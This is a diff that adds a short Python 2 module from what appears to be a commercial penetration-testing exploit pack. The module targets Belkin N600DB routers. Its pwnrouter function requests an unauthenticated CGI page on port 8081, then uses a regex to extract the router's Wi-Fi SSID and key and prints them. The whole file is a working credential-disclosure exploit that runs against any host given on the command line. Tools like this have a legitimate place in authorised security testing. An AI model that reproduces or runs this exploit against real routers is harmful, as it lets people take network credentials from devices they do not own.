@@ -1,0 +1,47 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+import urllib
+
+_name_   = 'd2sec_belkin_4'
+_vendor_ = 'belkin'
+_model_  = ['N600DB']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://the-infosec.com/2018/01/18/from-shodan-to-rce-3-hacking-belkin-routers/'
+_port_   = 8081
+
+def pwnrouter(host,port=_port_):  
+  try:
+    url = "http://%s:%s/adv_wifidef.cgi" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if ("G_ssid" in response.text) and ("G_key" in response.text):
+    print '[+] %s vulnerable' % host
+    m = re.search('top\.G_ssid=\[unescape\("([^"]+)"\).+top\.G_key=\[unescape\("([^"]+)"\)', response.text, re.DOTALL)
+    ssid = ''
+    key = ''    
+    if m is not None:
+        ssid = m.group(1)
+        key = m.group(2)        
+    print('\nSSID: %s\nKey: %s\n'%(urllib.unquote_plus(ssid),urllib.unquote_plus(key)))              
+  else:
+    print '[+] %s not vulnerable' % host    
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
